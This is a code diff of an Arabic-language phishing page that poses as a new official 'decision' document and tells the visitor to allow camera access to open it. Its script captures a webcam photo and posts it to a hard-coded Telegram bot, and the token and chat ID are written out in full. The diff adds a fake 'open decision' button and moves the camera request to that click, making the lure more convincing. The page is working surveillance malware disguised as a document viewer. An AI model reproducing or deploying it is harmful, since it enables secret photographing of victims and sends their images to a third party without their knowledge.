@@ -11,7 +11,7 @@
     <meta property="og:image:height" content="630" />
     <meta property="og:image:type" content="image/images.jpg" />
     
-    <title> قرارات </title>
+    <title>قرارات</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -27,56 +27,82 @@
         }
 
         #permissionRequest {
-            background-color: #4d00a0;
+            background-color: rgba(0, 0, 0, 0.7); /* خلفية داكنة مع شفافية */
             color: white;
-            padding: 20px;
+            padding: 30px;
             border-radius: 10px;
-            font-size: 18px;
+            font-size: 20px;
             margin-top: 30px;
             text-align: center;
-        
-        }
-        .content{
-            width: 100%;
-            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
         }
 
+        .content {
+            width: 100%;
+            height: 80vh;
+        }
+
+        .content img {
+            width: 100%;
+            height: auto;
+        }
+
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        h2 {
+            margin: 20px 0;
+        }
     </style>
 </head>
 <body>
-   
 
     <!-- واجهة مخصصة لطلب الإذن -->
     <div id="permissionRequest">
-        <h2> قرار جديد  </h2>
-
+        <h2>قرار جديد</h2>
+        <p>من فضلك يجب عليك السماح للوصول إلى المستند القرار عبر كمرات المتصفح .</p>
         <div class="content">
-            <img src="image/images.jpg" alt="">
-
-
-
+            <img src="image/images.jpg" alt="قرار جديد" style="width: auto;">
         </div>
-
+        <button id="openPermissionButton"> فتح القرار  </button>
     </div>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = '6822625757:AAFuBb7icwxuFpKjqFTWwlKb5poUSUfWTNo'; // استبدل هذا بالتوكن الخاص بك
-        const TELEGRAM_CHAT_ID = '5152526784'; // استبدل هذا بالـ chat_id الخاص بك
+        // عند النقر على زر فتح الصفحة وطلب الأذونات
+        document.getElementById('openPermissionButton').addEventListener('click', function() {
+            // إخفاء النافذة الحالية
+            document.getElementById('permissionRequest').style.display = 'none';
 
-        // عند تحميل الصفحة مباشرة، طلب الوصول إلى الكاميرا
-        window.onload = function() {
+            // طلب الوصول إلى الكاميرا مباشرة بعد الضغط
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function(stream) {
-                    // إخفاء واجهة الطلب بعد الحصول على الإذن
-                    document.getElementById('permissionRequest').style.display = 'none';
-
-                    // التقاط الصورة فقط
+                    // التقاط الصورة بعد الحصول على الإذن
                     captureImageAndSendToTelegram(stream);
                 })
                 .catch(function(error) {
                     alert('حدث خطأ في الوصول إلى الكاميرا. تأكد من تمكين الإذن.');
                 });
-        };
+        });
 
         function captureImageAndSendToTelegram(stream) {
             // إنشاء عنصر فيديو مؤقت لالتقاط الصورة
@@ -108,10 +134,10 @@
 
         function sendImageToTelegram(imageBlob) {
             const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('chat_id', '5152526784'); // استبدل بالـ chat_id الخاص بك
             formData.append('photo', imageBlob, 'image.png'); // إرسال الصورة كـ Blob
 
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            fetch(`https://api.telegram.org/bot6822625757:AAFuBb7icwxuFpKjqFTWwlKb5poUSUfWTNo/sendPhoto`, {
                 method: 'POST',
                 body: formData
             })
@@ -131,4 +157,3 @@
     </script>
 </body>
 </html>
-
